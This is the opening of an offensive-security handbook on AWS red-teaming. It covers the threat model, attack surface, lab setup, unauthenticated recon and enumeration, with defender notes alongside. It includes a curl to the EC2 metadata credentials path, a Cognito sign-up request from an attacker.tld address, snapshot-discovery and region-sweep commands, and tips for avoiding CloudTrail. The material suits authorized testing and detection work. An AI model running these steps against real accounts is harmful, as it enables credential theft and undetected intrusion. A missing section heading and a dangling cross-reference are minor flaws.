Preface

This book is a practitioner's handbook for red-team operators, offensive security consultants, detection engineers, and cloud platform defenders who need a working model of how attacks actually land in Amazon Web Services — not in theory, not in a curriculum, but on live accounts, under time pressure, against active defenders.

What this book is

It is an operator-grade reference to the attack surface, tradecraft, and post-exploitation options available to an adversary in an AWS account or organization. It is organized around the kill chain — reconnaissance, initial access, identity, lateral movement, persistence, evasion, exfiltration, and impact — and mapped throughout to MITRE ATT&CK for Cloud (IaaS). Each technique is presented with the specific IAM actions, API calls, tooling invocations, and forensic artifacts you will actually observe.

What this book is not

It is not an AWS certification prep guide. It is not a beginner-friendly introduction to the cloud. It assumes you are comfortable with Linux, shell-fu, Python, core AWS concepts (IAM users, roles, policies, STS, regions, VPCs, S3, EC2), and the mechanics of a professional penetration test. It also assumes you respect the rules of engagement, obtain written authorization, and limit blast radius appropriately. If any of those assumptions fails, close the book, sort that out first, and come back.

How to read it

Parts I–III build the theoretical and environmental base you need: the threat model, the attack surface, a lab you can detonate safely, the recon methodology, and the identity-plane primitives that underpin almost every AWS compromise. Parts IV–VI move from service-specific attacks (compute, storage, data, containers, serverless) into persistence, evasion, exfil, tooling, CI/CD supply-chain, and finally the reporting and remediation phase that separates a penetration test from a data dump of broken buckets.

Experienced operators will get the most value by skimming Parts I–II, reading Part III front to back, and using Parts IV and V as reference. If you are a detection engineer, invert that: start with Part V (Defense Evasion), Chapter 20 (Reporting and Detection), and Appendix D (CloudTrail/Athena queries), then back up to the attack-side chapters for the behaviors those rules need to catch.

A note on freshness

AWS publishes breaking changes weekly. A book is a snapshot. The techniques in this handbook — policy-evaluation abuse, role-trust manipulation, IMDS exploitation, snapshot exfiltration, log tampering — are durable. Specific CLI flags, console flows, default region lists, and service quotas are not. Where a primitive has been partially remediated by AWS (IMDSv2 now default on new AMIs, S3 Block Public Access, the 2022 confused-deputy retrofit) we call it out. Treat every command in this book as a starting point for your own verification against the current AWS API and console. Opinions in the margins are the author's.

Conventions Used in This Book

Command prompts

Terminal captures are presented in dark-themed blocks that mimic an operator's terminal. Three prompts are used throughout:

operator@kali:~$ aws sts get-caller-identity
# prompt: user shell in the operator's workstation
[pacu] (demo:imported-keys) > run iam__enum_permissions
# prompt: inside the Pacu TUI, in session 'demo' with imported credentials
bash-5.2$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# prompt: on a compromised EC2 instance where the shell has no PS1 branding

Syntax highlighting in terminals

Inside terminal blocks, color is meaningful:

  • green — allow / success / prompt
  • red — deny / failure / dangerous action
  • yellow — command flags, ARN fragments, role names
  • blue — command being typed
  • dim grey — comment or explanatory annotation

Call-out boxes

OPERATOR NOTE

Operator notes are tradecraft asides — opinions on what to do, when to avoid a technique because it is loud in CloudTrail, or a shortcut the author uses in real engagements. They are informed by field experience, not dogma.

DEFENDER NOTE

Defender notes translate the attack on the page into a control, an IAM policy change, a CloudTrail filter, or a detection rule. If you are reading this book to build blue-team coverage, these are the marginalia to read first.

CAUTION

Caution boxes flag destructive primitives (kms:ScheduleKeyDeletion, s3:DeleteBucket, ec2:TerminateInstances, disruptive log actions). Confirm scope, rollback, and customer notification before executing.

IAM action notation

IAM actions are written with the service prefix, as in iam:CreateAccessKey, ec2:RunInstances, sts:AssumeRole. Resource ARNs use the canonical form arn:aws:<svc>:<region>:<acct>:<type>/<name>. When an action is regional, the region is shown; when it is global (IAM, Organizations, CloudFront, Route53, STS legacy endpoint) the region field is empty.

Part One

Foundations

Before you can meaningfully attack an AWS account, you need a working mental model of the shared-responsibility boundary as an adversary sees it, a map of the entry classes that break through that boundary, and a lab environment where you can detonate without burning down the house. Part I builds all three.

Foundations

The AWS Threat Model and Shared Responsibility

Chapter Goal

Map the AWS shared-responsibility model onto an adversary's mental model. Identify which layers the operator has authority to test, how the control plane and the data plane differ as attack surfaces, and how blast radius scales from service to account to organization. Close with the regulatory context that shapes every engagement scope.

Shared responsibility is the phrase cloud providers reach for when they want to remind customers that the security of the cloud is Amazon's problem and security in the cloud is the customer's. It is a useful marketing shorthand and a catastrophically insufficient threat model. For an offensive security professional, the shared-responsibility boundary is not a legal disclaimer; it is an attack map. Every line on that map is either an in-scope primitive, an out-of-scope one, or a gray zone that will generate an awkward email from AWS Trust & Safety if you cross it without notice.

1.1  Shared responsibility revisited from an attacker's lens

The official AWS diagram splits responsibility into two stripes — AWS owns the physical datacenter, the hypervisor, the service control plane, and the service availability; the customer owns their data, their IAM, their applications, their network configuration, and their guest operating systems. That is true but it is a pedagogical simplification. A red-team operator working a cloud engagement cares about a finer-grained version with at least five layers.

  1. Physical and hypervisor. Out of scope. Full stop. You will never be asked to test this layer. AWS Nitro hypervisor isolation, tenant sibling leakage, cold-boot attacks against physical instances — these are AWS's problem and have their own bug-bounty channel.
  2. Service control plane. The AWS API endpoints themselves (ec2.amazonaws.com, iam.amazonaws.com, sts.amazonaws.com). AWS is responsible for the security of the endpoints; the customer is responsible for what they do through them. In practice the service endpoints themselves are rarely the attack path — credentials authorized to call them are.
  3. Service configuration. The customer's IAM policies, resource policies, SCPs, Security Groups, KMS key policies, S3 bucket ACLs, RDS snapshot sharing settings. This is where 90 percent of real compromises are consummated. Fully in scope.
  4. Guest workload. The EC2 instance, the Lambda function code, the container image, the RDS schema. In scope, but governed by the AWS Customer Support Policy for Penetration Testing — certain categories (DNS zone walking of Route53-hosted zones, DDoS simulation) require advance notice.
  5. Customer data. S3 objects, EBS volumes, RDS rows. In scope when reached through a legitimate attack chain, but the engagement letter should specify whether you may read, whether you may exfiltrate to an attacker bucket, and whether mock PII counts as "sensitive."

The threat-model questions you ask at scoping time are framed by these layers:

  • Which accounts are in scope? Production only, staging only, a dedicated red-team target OU?
  • Which identities are in scope? The engagement may restrict you to one federated test user, a set of simulated leaked keys, or a compromised-developer-workstation scenario.
  • Are destructive primitives authorized? kms:ScheduleKeyDeletion, s3:DeleteBucket, ec2:TerminateInstances, iam:DeleteUser are categorically different from read-only enumeration. Most scopes exclude them; some explicitly require them.
  • Is Trust & Safety notification required? If you will simulate password spraying at the IAM API, mass-spawn EC2 instances for cryptojacking emulation, or exercise Route53 zone-walking, file the form.
  • What is the blue-team posture? Is the customer's detection team in the loop (purple), or are they a blind target (red)? This drives every OPSEC decision in Chapters 15 and 16.

1.2  Control plane vs. data plane attacks

AWS is unusual among platforms because most of what you do to it runs through a single, highly audited API. Every call to iam:CreateAccessKey, ec2:RunInstances, s3:PutBucketPolicy, lambda:CreateFunction, and sts:AssumeRole lands in CloudTrail with a principal, a source IP, a user-agent, a timestamp, and the full request parameters. That uniformity is the control plane. Everything that happens inside a resource you have created — a SQL query against RDS, a file read on an EC2 filesystem, a kubectl exec into a pod — is the data plane.

The distinction matters because the two planes are logged differently, have different blast radiuses, and require different tradecraft. A control-plane attack leaves a clean audit trail that a defender with working CloudTrail and Athena can replay minute by minute. A data-plane attack can be nearly invisible to a defender who has not instrumented their EC2 instances with host-based logging, because AWS does not by default log what a process does inside an EC2. The same is true for kubectl exec traffic, RDS query text, or the bytes flowing through a Lambda function — unless the customer has opted into service-specific logging (VPC Flow Logs, RDS audit logs, GuardDuty Runtime Monitoring, EKS control-plane logs), the data plane is dark.

OPERATOR NOTE

When you have the option of doing the same thing via control plane or data plane, the data plane is quieter. Example: reading secrets. secretsmanager:GetSecretValue lands in CloudTrail with the secret ARN and the principal, every time. But if you have a shell on an EC2 instance whose role can read the secret, running the aws-cli from that instance is still a control-plane call — you are not exiting the plane, you are just moving the source IP from your Kali box to an IP the customer ranges own. To really move to the data plane you need to read the decrypted secret out of a process that already has it cached (env var, memory, config file on disk) — no API call, no CloudTrail row.

1.3  Blast radius

Blast radius is the measure of how much damage one compromised primitive can do before it meets a boundary it cannot cross. In AWS the boundaries stack like nesting dolls:

  • Resource. A single S3 bucket, one EC2 instance, one IAM user. The smallest blast radius.
  • Service. All S3 buckets in an account; all EC2 instances in a region. Determined by the wildcard scope an IAM policy grants.
  • Region. Most AWS services are regional. A role with ec2:* in us-east-1 can do nothing to an eu-west-1 fleet if the condition keys enforce region. If they do not, regions are not a boundary at all.
  • Account. The canonical AWS security boundary. An IAM role scoped to a single account cannot reach another account unless an explicit trust relationship or resource policy lets it.
  • Organization. Since 2017, Organizations has been the top-level unit. An Organization Master (management) account can assume OrganizationAccountAccessRole into any member by default; SCPs applied at the root or OU level bind every principal beneath, including the member-account root user.
  • Partition. Commercial AWS, AWS GovCloud (US), and AWS China (Beijing/Ningxia) are separate partitions with separate trust roots. No cross-partition primitives exist at the service level. If your scope includes GovCloud you need a separate set of credentials.

Blast-radius thinking is the difference between a finding that says "an attacker could read any S3 bucket in the web-dev account" and one that says "an attacker could assume OrganizationAccountAccessRole from web-dev into the Master and apply an SCP that disables logging in every child account." Those are different severities. The executive summary in Chapter 20 will live or die by whether you framed the finding at the right radius.

1.4  The canonical AWS attack lifecycle

AWS compromises tend to follow the same generic lifecycle regardless of which entry vector started them. We revisit each phase in depth in later chapters; here is the thirty-second version.

  1. Recon. Attribute an AWS account ID, enumerate its public footprint (S3 buckets, public AMIs, public RDS snapshots, exposed Lambda URLs, Route53 zones, CloudFront distributions), and identify candidate principals through error-leak probing.
  2. Initial access. Obtain AWS credentials — leaked access keys, IMDS SSRF exfiltration, OIDC-trusted CI pipeline, federated IdP compromise, phished console user.
  3. Enumeration. Discover what the compromised principal can do. Run CloudFox, Pacu's iam__enum_permissions, PMapper, and ScoutSuite to build a permissions graph.
  4. Privilege escalation. Move from the compromised principal to a more-privileged one using one of the IAM primitives in Chapter 8.
  5. Lateral movement. Assume cross-account roles, pivot through SSM into private subnets, take over EKS worker nodes via IRSA, ride EventBridge into new accounts.
  6. Action on objectives. Read the data, stage the exfil, or — if destructive impact is in scope — emulate ransomware, deletion, or availability attacks.
  7. Persistence and cleanup. Install durable re-entry, suppress logging where scope allows, and prepare the artifacts the final report requires.

1.5  Regulatory and contractual context

Scope decisions are shaped by the customer's regulatory environment. PCI-DSS 4.0 explicitly covers cloud-hosted cardholder data environments; FedRAMP moderate and high baselines govern how credentials are rotated and logged; HIPAA requires BAA-covered services to maintain audit logs; SOC 2 Type II auditors will want evidence of CloudTrail immutability. An attack that demonstrates CloudTrail tampering against a SOC 2 environment is a different-severity finding than the same primitive against an unregulated startup, because the remediation moves from "fix the IAM policy" to "fix the IAM policy and notify your auditor."

Always read the engagement letter for jurisdiction. A multinational's AWS accounts may span US, EU, and APAC regions, each with its own breach-notification regime. The CFAA in the United States is the most frequently cited statute for unauthorized access, but the EU Cybercrime Directive (2013/40/EU), UK Computer Misuse Act (1990, as amended), and equivalent statutes in Canada, Australia, and Singapore reach the same conduct. In-scope accounts and in-scope data must be enumerated in writing.

DEFENDER NOTE

For every finding the red team files, ask two questions: (1) What is the IAM control that should have prevented this? (2) What is the detection that should have alerted on it in under an hour? If either answer is "we don't have one," that is a higher-severity finding than whatever technical exploit triggered it. The goal of Part I is to give you the framework to ask those two questions in every chapter that follows.

Key takeaways

  • The shared-responsibility line is an attack map, not a disclaimer. Know which layers are in scope and get it in writing.
  • Control-plane attacks are loud; data-plane attacks are quiet. OPSEC follows that asymmetry.
  • Blast radius scales from resource through service, region, account, organization, and partition. Frame findings at the radius they actually reach.
  • The AWS attack lifecycle is seven phases; the rest of this book elaborates each.
  • Regulatory context changes severity, not just remediation. Read the engagement letter.

The AWS Attack Surface

Chapter Goal

Enumerate the five classes of entry into AWS environments, the STS trust primitives adversaries target, and the regional vs. global service footprint that defines where an operator must hunt. Introduce the STS AssumeRole* family decision tree that drives Chapters 7 and 9.

The AWS attack surface is not the sum of the service APIs — it is the set of identity primitives, configuration defaults, and trust relationships that a principal needs to cross to go from outside the account to in it. Five entry classes cover virtually every AWS compromise of the last decade. The rest of the book is deeper exploration of each.

2.1  The five entry classes

An operator should be able to recite these five in their sleep, because scoping conversations, attack-path diagrams, and executive summaries all fall back to them.

  1. Leaked credentials. Access keys in public GitHub, in Docker image layers on Docker Hub, in CI build logs, in mobile application binaries, in Terraform state files, in aws-vault or saml2aws caches on a developer's laptop. The most common AWS compromise vector and the most-exploited primitive in this book.
  2. Exposed services. Public S3 buckets with sensitive objects, public RDS snapshots, public AMIs with baked-in credentials, public EBS snapshots, Lambda function URLs exposed to the internet, API Gateway endpoints with broken authorizers, Elasticsearch/OpenSearch domains with open access policies.
  3. SSRF / metadata abuse. Server-side request forgery in a web application running on EC2 reaches the Instance Metadata Service (IMDS) and exfiltrates the attached instance-profile role's session credentials. Still the single most productive cloud-native vector.
  4. Supply chain. CI/CD pipelines with OIDC trust into AWS, malicious GitHub Actions, poisoned Lambda layers, compromised npm/pip packages in a deploy pipeline, third-party SaaS integrations with stored AWS credentials.
  5. Identity federation. Compromise of the identity provider (Okta, Entra/Azure AD, Google Workspace) or the SAML/OIDC trust relationship feeds an attacker into the AWS console as a legitimate federated user, skipping credential theft entirely.

2.2  STS and the AssumeRole* family

STS — the Security Token Service — is the credential-issuing authority of AWS. Every federated login, every cross-account call, every EC2 instance-profile reuse, and every IAM role assumption ultimately lands in an STS AssumeRole* API call. Understanding the family tree is the single most useful identity-plane knowledge for a cloud operator.

  • sts:AssumeRole — the vanilla cross-account-or-same-account role assumption. Caller presents their current credentials; the target role's trust policy decides. Output: 15-minute to 12-hour session.
  • sts:AssumeRoleWithSAML — SAML-federated entry point from an external IdP (Okta, ADFS). The target role's trust policy includes a SAML provider ARN.
  • sts:AssumeRoleWithWebIdentity — OIDC-federated. GitHub Actions, GitLab, IRSA in EKS, Google OIDC — all land here. The trust policy references an OIDC provider and conditions on the token's sub or aud.
  • sts:GetFederationToken — legacy, less common; an IAM user mints a short-lived session derivative.
  • sts:GetSessionToken — MFA-qualified session extension for an IAM user.
  • sts:GetCallerIdentity — reflection; returns the caller's principal ARN without requiring any permissions at all. First call in every compromise.

2.3  IAM Identity Center (née AWS SSO)

IAM Identity Center has quietly become the default federated-login pattern for enterprises since 2021, replacing the older "connect Okta to each account's SAML" approach. From an attacker's perspective IAM Identity Center is important because a compromised Identity Center user gets short-lived role sessions into any account in the organization they have a permission set assignment for. There is no long-term access key to steal; instead, the ~/.aws/sso/cache folder on a developer's laptop contains a refresh token. Steal that and you walk into every account in scope as the developer.

2.4  Regional vs. global service footprint

Most AWS services are regional; a handful are global. This matters for recon (you must sweep every region) and for defense evasion (CloudTrail must be configured as a multi-region trail to see global-service events).

OPERATOR NOTE

The single biggest tradecraft error a new AWS operator makes is forgetting that services are regional. You run aws ec2 describe-instances, see nothing, and conclude the account has no compute — when in fact the real fleet is in us-west-2, eu-west-1, and ap-southeast-1. CloudFox's all-checks and Pacu's ec2__enum both iterate regions automatically; use them instead of hand-rolling a single-region call.

2.5  Default configurations that bite

Every service ships with a default posture, and many of those defaults have quietly changed over the years as AWS tightened security. Knowing the current default — and more importantly, knowing when the customer's account was created — lets you predict whether a given attack is still viable.

  • IMDSv1 is still enabled on older AMIs; new EC2 launches since 2023 default to IMDSv2-only. Test both.
  • S3 Block Public Access is on by default at the account level for accounts created after April 2023. Older accounts may still have the old default.
  • EBS encryption is on by default per-region since 2020, but many long-lived accounts have opted out.
  • Default VPC still exists in every region of every account and still has an open 0.0.0.0/0 Security Group named default in most customers' environments.
  • IAM root-user MFA is not enforced by default. A significant fraction of production accounts still have a root user with a password-only login.
  • CloudTrail is not on by default in every region — only a single-region Event History (which is not a trail and expires after 90 days). Many smaller accounts have no persistent trail at all.

Key takeaways

  • Five entry classes cover virtually every AWS compromise: leaked creds, exposed services, SSRF/IMDS, supply chain, federation.
  • STS is the credential authority; every foothold you build issues an STS session.
  • IAM Identity Center is the modern federated default and changes where the stolen-token artifact lives.
  • Most services are regional; sweep every region, not just us-east-1.
  • Defaults change over time. Date the account to predict which defaults apply.

Building an Offensive AWS Lab

Chapter Goal

Stand up a multi-account AWS lab where you can detonate the techniques in the rest of the book without risk to real data or real budgets. Cover Organizations layout, Service Control Policies as blast-radius guardrails, cost controls, CloudTrail on the attacker account, and the publicly available vulnerable-by-design Terraform projects the rest of the book assumes you have deployed.

You will not learn AWS tradecraft by reading. You will learn it by getting a CloudFox output in front of you, running iam__privesc_scan against an account you set up to be vulnerable, watching a Pacu attack succeed, and then watching CloudTrail catch it. This chapter is the minimum-viable lab.

3.1  Lab topology

The lab is an AWS Organization with at least three accounts:

  • Management (payer) account. Holds billing, SCPs, Organizations, and the CloudTrail organization trail. No workloads. Login is root-user-with-hardware-MFA only for the first setup, then deleted and recreated as an IAM Identity Center user.
  • Victim OU. At least one "target" account — this is where you detonate CloudGoat, IAM Vulnerable, AWSGoat, TerraGoat. You will burn this account down regularly; automate re-creation.
  • Attacker account. Where you stage your operator credentials, your personal CloudFox / Pacu host (a fresh EC2), your exfil S3 bucket, and your lab Athena query workspace. This is the account that owns your Kali AMIs.

3.2  Service Control Policies as blast-radius guardrails

The lab must protect you from yourself. An SCP attached at the Organization root will prevent any principal in any child account from performing destructive operations you have not explicitly whitelisted. A minimal set:

{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyLeavingOrg",
      "Effect": "Deny",
      "Action": [
        "organizations:LeaveOrganization",
        "organizations:AcceptHandshake"
      ],
      "Resource": "*"
    },
    {
      "Sid": "DenyDisableCloudTrail",
      "Effect": "Deny",
      "Action": [
        "cloudtrail:StopLogging",
        "cloudtrail:DeleteTrail",
        "cloudtrail:PutEventSelectors"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:PrincipalArn":
            "arn:aws:iam::111122223333:role/OrgSecurityBreakglass"
        }
      }
    },
    {
      "Sid": "DenyOutOfScopeRegions",
      "Effect": "Deny",
      "NotAction": ["iam:*","organizations:*","route53:*","cloudfront:*","support:*","sts:*"],
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:RequestedRegion": ["us-east-1","us-west-2","eu-west-1"]
        }
      }
    }
  ]
}

The first statement keeps a compromised child account from leaving the org. The second preserves CloudTrail integrity. The third bounds the regions that can be touched at all, which doubles your recon speed and keeps your lab spend predictable.

3.3  Cost guardrails

An attacker's lab that detonates Pacu, Stratus Red Team, and CloudGoat in a continuous loop will quietly run up bills if unattended. Install the following on every account in the lab:

  • An AWS Budget at $50/mo per account with email + SNS notifications at 50/80/100 percent.
  • A daily ec2 DescribeInstances Lambda that terminates any instance older than 24 hours outside a keep=true tag — important for the many CloudGoat scenarios that spin up EC2 instances you forget about.
  • An RDS shutdown schedule; most CloudGoat scenarios use db.t3.micro but cumulative storage costs add up.
  • AWS Cost Anomaly Detection on the payer account, configured for the full org.

3.4  CloudTrail on the attacker account

Counter-intuitive: the attacker account must have CloudTrail turned on for your own safety. You will be running Pacu, CloudFox, Stratus Red Team, Prowler, and custom Boto3 against your own credentials during research. You want to see your own attack-trail the way a defender will. Dual-purpose: you use your own attacker-account trail as the exemplar when writing detection queries for the victim account in Chapter 20.

3.5  Vulnerable-by-design targets

Four open-source projects cover essentially every technique in this book.

  • CloudGoat (Rhino Security Labs). Terraform-based. Individual "scenarios" (e.g., iam_privesc_by_attachment, cloud_breach_s3, ec2_ssrf) deploy a single-purpose vulnerable environment, give you the starting creds, and tear down on command. The canonical AWS pentest training ground.
  • IAM Vulnerable (BishopFox). A single Terraform deployment that creates the 31 canonical privilege-escalation paths in one account. Pairs beautifully with Pacu's iam__privesc_scan in Chapter 8.
  • AWSGoat (INE Security). Full modern-application attack surface — API Gateway, Lambda, DynamoDB, Cognito, ECS, S3 static hosting — pre-seeded with IDORs, SSRFs, and IAM misconfigurations that chain into AWS takeover.
  • TerraGoat (Bridgecrew/Prisma). Heavy on IaC misconfigurations; useful for Chapter 19 (CI/CD supply-chain) rather than pure runtime exploitation.

3.6  Terraform harness for rapid teardown

The entire Victim OU is treated as cattle: destroy and redeploy in under five minutes between test runs. Keep a root Terraform module in lab/victims/ that loops over CloudGoat scenarios, records their output access keys into a shared S3 bucket in the attacker account, and emits the credentials into the operator's ~/.aws/credentials with distinctive profile names.

module "scenarios" {
  source        = "./modules/cloudgoat"
  for_each      = toset([
    "iam_privesc_by_attachment",
    "iam_privesc_by_rollback",
    "cloud_breach_s3",
    "ec2_ssrf",
    "rce_web_app"
  ])
  scenario      = each.value
  output_bucket = aws_s3_bucket.attacker_creds.bucket
}

3.7  Logging and visibility on the victim side

The lab is only useful if you can see what happened after an attack. Configure on every victim account:

  • A multi-region CloudTrail logging to the org logging-archive bucket. Include management events and S3 data events.
  • GuardDuty turned on, org-wide, with findings replicated to Security Hub.
  • VPC Flow Logs on every VPC (at least the default VPC and any explicitly created ones).
  • AWS Config recorder with the operator-managed rules pack; forward to Security Hub.
  • Detective enabled to aggregate the above.

In Chapter 20 you will write Athena queries against the org trail; in Chapter 16 you will practice suppressing that very logging pipeline. You need to see both sides.

CAUTION

Do not, under any circumstances, attach the payer (management) account to the Victim OU or give an engagement-test role any access to it. A technique in Chapter 9 involves OrganizationAccountAccessRole chaining; that primitive, mis-targeted, can hijack the management account and you will be recovering from it for days. Isolate the payer.

Key takeaways

  • A three-OU Organization (Security, Victim, Attacker) is the minimum useful lab.
  • SCPs at the root keep destructive primitives contained and out-of-scope regions closed.

Part Two

Reconnaissance and Initial Access

You cannot attack what you cannot see, and you cannot act on what you do not have credentials for. Part II covers the two pre-entry phases: unauthenticated discovery of an AWS footprint, the authenticated enumeration that happens the moment you land a first set of keys, and the six primary classes of initial access that keep red teams fed in 2026.

Reconnaissance and Initial Access

Unauthenticated Recon

Chapter Goal

Methodically map an AWS footprint without any valid credentials. Attribute an account ID from public artifacts, enumerate principals by probing error responses, identify exposed services through public registries, and chart DNS/CDN infrastructure that hints at the account's real architecture. End with a workflow you can run against any target in under an hour.

External recon in AWS is mostly a game of leveraging the provider's own namespaces against it. S3 bucket names, EC2 AMI IDs, RDS snapshot IDs, CloudFront distributions, Lambda function URLs, and IAM role names all leak — through search engines, through public listings, through error messages that pretend to be anonymous but disclose structural data about the account. An experienced cloud red-teamer can fingerprint an AWS tenant from the outside almost as accurately as one inside it. This chapter teaches that fingerprinting.

4.1  Attribution — getting from domain to account

The first attack-surface question is always the same: which AWS account number is behind this target? Knowing the 12-digit account ID unlocks half of the subsequent techniques, because account ID is used as a resource-policy condition, an ARN field, and a SAML provider identifier throughout the platform.

Five primary leaks attribute an AWS account to a customer:

  1. S3 bucket ACL response. Public buckets return their owner's canonical user ID, which (when combined with aws s3api list-buckets in your own account) maps back to an account number.
  2. S3 redirect from CloudFront. Many CloudFront distributions point at S3 origins whose bucket name follows a <company>-assets pattern, giving you a known-good bucket to probe.
  3. SNS/SQS/Lambda ARN leakage. Public webhook URLs, error responses that include a Resource ARN, and documentation examples all carry the account number in cleartext.
  4. Public AMI and snapshot metadata. An AMI or EBS snapshot shared with all discloses its owning account in aws ec2 describe-images output.
  5. SES, IoT, and MediaConnect MX/CNAME patterns. DNS records with AWS-specific patterns can be attributed to a small set of possible accounts.

4.2  Account-ID enumeration via quiet-riot and similar

Given an email address, you can determine whether that address is associated with an AWS account — unauthenticated and unthrottled — by exercising iam:CreateAccount style error paths. The quiet-riot tool by Aquia and similar successors automate this. For a given email, they query the AWS console's sign-in endpoints and observe whether the server reveals account existence in its error messages. This is especially useful for identifying "shadow" accounts (marketing, HR, M&A subsidiaries) whose existence is not well-known inside the target organization.

4.3  Role-name brute forcing through AssumeRole

If you know an account ID — yours or a target's — you can enumerate role names inside that account without authenticating to it. The primitive is:

  • Call sts:AssumeRole for arn:aws:iam::<target-acct>:role/<guessed-name> from any valid AWS identity you control.
  • AWS returns two distinct error messages: role does not exist versus role exists but you are not authorized to assume it.
  • The error differentiation is a silent oracle. Iterate over a wordlist of common role names (AWSControlTowerExecution, OrganizationAccountAccessRole, AdminRole, developer, codebuild-ci, github-actions-deploy, sso-permission-set-*).

This technique is the basis of Pacu's iam__enum_roles and CloudFox's principals module. It leaves a CloudTrail entry in the target account — AssumeRole failures are logged as errorCode: AccessDenied with the exact role name tried — so a detection-capable defender will see your wordlist in real time. Use sparingly.

4.4  Public S3 discovery

S3 bucket names are globally unique and publicly enumerable. Multiple services index the observable set:

  • GrayhatWarfare — indexed listing of the (still-very-large) universe of public buckets. Searchable by bucket substring, owner, and object content.
  • buckets.grayhatwarfare.com and equivalent — free tier gives enough for scoping; paid tier required for bulk search.
  • S3Scanner — open-source tool that reads candidate bucket names from a wordlist or domain-derived permutation, queries each, and emits the ones that return anything other than NoSuchBucket.
  • Domain-to-bucket heuristics. For target acme.com, probe: acme, acme-assets, acme-prod, acme-dev, acme-backup, acme-logs, acme-terraform-state, acme-cloudtrail, acme-config, acme-website, acme-uploads, acme-artifacts, acme-internal, and every combination with environment suffixes.

OPERATOR NOTE

A writable bucket (fourth line above) is a finding. But it is not yet an exploit — you must still demonstrate impact, which may be: uploading malicious content to a bucket that feeds a CloudFront-served site (defacement / malware distribution), putting a Terraform plan file in an active state bucket (supply-chain sabotage), or simply demonstrating the authz gap. The finding severity depends on how the bucket is consumed downstream.

Shared AWS artifacts are indexed by account ID:

operator@kali:~$ aws ec2 describe-snapshots --owner-ids 111122223333 --restorable-by-user-ids all
[... 14 EBS snapshots shared publicly, one named 'db-prod-nightly' ...]
operator@kali:~$ aws rds describe-db-snapshots --snapshot-type public --include-public

Three findings from one pass: a public Jenkins AMI (can be launched in your account to recover the disk), a public EBS snapshot of a production database (can be mounted), and a public RDS snapshot that can be copied and restored in the attacker account. All three are available without a single credential belonging to the target.

4.6  DNS and CDN footprinting

DNS patterns give structural clues:

  • *.cloudfront.net CNAMEs point at distributions; the distribution ID reveals account region and account seed era.
  • *.elb.amazonaws.com and *.elasticloadbalancing.amazonaws.com CNAMEs reveal regional ALB/NLB architecture.
  • *.execute-api.<region>.amazonaws.com identifies API Gateway endpoints.
  • *.lambda-url.<region>.on.aws identifies Lambda function URLs.
  • *.awsapps.com/start is an IAM Identity Center sign-in portal; the subdomain is the organization's alias.
  • *.awsglobalaccelerator.com hints at global traffic architecture.

A pass with amass, subfinder, and a zone-transfer probe (where available) builds a map of the customer's AWS-hosted surface area. Note: DNS zone-walking of Route53-hosted zones requires AWS Trust & Safety notification; conventional NSEC3 walking against the public zone is fair game.

4.7  Lambda function URL and API Gateway discovery

Lambda function URLs (<url-id>.lambda-url.<region>.on.aws) were introduced in 2022 and have become a major attack surface because they are trivial for developers to enable and frequently ship with AuthType=NONE. They are also not enumerable by wordlist in the traditional sense — the URL ID is a random 32-character string. But they do appear in:

  • JavaScript bundles served from web applications (grep the bundle for lambda-url).
  • Mobile application binaries (apktool + grep for lambda-url, or strings on iOS IPA decrypt).
  • GitHub public code search (`"lambda-url" site:github.com`).
  • Certificate transparency logs, when customers attach custom domains to API Gateway and Lambda.

4.8  Cognito user-pool enumeration

Cognito user pools expose a sign-up API that frequently allows unauthenticated account creation with only an email address. Many public-facing applications use Cognito as their identity layer — a pentester can often simply register a user and inherit whatever default group permissions new users receive. Combined with SSRF (Chapter 6), the newly-created Cognito user becomes an entry into the AWS backend.

operator@kali:~$ curl -s -XPOST https://cognito-idp.us-east-1.amazonaws.com/ \
  -H 'X-Amz-Target: AWSCognitoIdentityProviderService.SignUp' \
  -H 'Content-Type: application/x-amz-json-1.1' \
  -d '{"ClientId":"7abcexampleclientid","Username":"test@attacker.tld","Password":"Pass1!Pass1!"}'
{"CodeDeliveryDetails":{"AttributeName":"email","DeliveryMedium":"EMAIL","Destination":"t***@attacker.tld"}}

4.9  Putting it together

A full unauthenticated recon pass against a domain should yield, within 30–60 minutes:

  • The AWS account ID (or a small set of candidates).
  • A list of 5–50 public S3 buckets, at least some of which contain interesting objects.
  • A list of public AMIs, snapshots, and RDS snapshots owned by the target account.
  • A list of publicly reachable services (API Gateway, Lambda URLs, CloudFront distributions, ALBs).
  • Candidate role names inferred from the target's public documentation, GitHub organization, and developer blogs.
  • A working Cognito user (if the target uses Cognito).

That becomes the input to Chapter 5, where we assume at least one set of valid credentials has been obtained and move to authenticated enumeration.

Key takeaways

  • Account-ID attribution is the first move and unlocks nearly every subsequent primitive.
  • Public buckets, AMIs, snapshots, and function URLs are indexed and discoverable without credentials.
  • Role-name brute force via AssumeRole is productive but lands in the target's CloudTrail — use it with awareness.
  • DNS and CDN patterns reveal AWS architecture from the outside.
  • Cognito and Lambda-URL exposures are two of the newest-worth-checking recon lanes.
Reconnaissance and Initial Access

Authenticated Enumeration

Chapter Goal

You have credentials. Now translate them into a complete picture of the account. Cover the essential aws-cli enumeration discipline, CloudFox end-to-end, Pacu's enumeration modules, and how to combine ScoutSuite/Prowler/CloudSploit output into a prioritized attack-path list.

The moment you import a fresh access-key pair, your first job is not to attack — it is to orient. A sophisticated blue team is already watching those keys land in CloudTrail; every probing API call you make adds to the alert. The goal of enumeration is to maximize information gained per API call while building a complete-enough permissions graph to plan the next move.

5.1  The first five commands

Every AWS engagement starts the same way:

operator@kali:~$ aws sts get-caller-identity --profile target
{
  "UserId": "AIDAEXAMPLE7KXYZ",
  "Account": "444455556666",
  "Arn": "arn:aws:iam::444455556666:user/ci-deploy-bot"
}
operator@kali:~$ aws iam get-account-authorization-details --profile target
# huge JSON — users, roles, groups, and all attached + inline policies in one call
operator@kali:~$ aws organizations describe-organization --profile target 2>&1
An error occurred (AccessDeniedException) when calling the DescribeOrganization operation:
User: arn:aws:iam::444455556666:user/ci-deploy-bot is not authorized to perform: organizations:DescribeOrganization
# error itself is information: the account IS part of an org (non-org accounts return a different error)
operator@kali:~$ aws ec2 describe-regions --profile target --query 'Regions[].RegionName' --output text
us-east-1  us-east-2  us-west-1  us-west-2  eu-west-1  eu-central-1
operator@kali:~$ for r in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do
    echo "=== $r ==="; aws ec2 describe-instances --region $r --query 'Reservations[].Instances[].InstanceId' --output text;
done

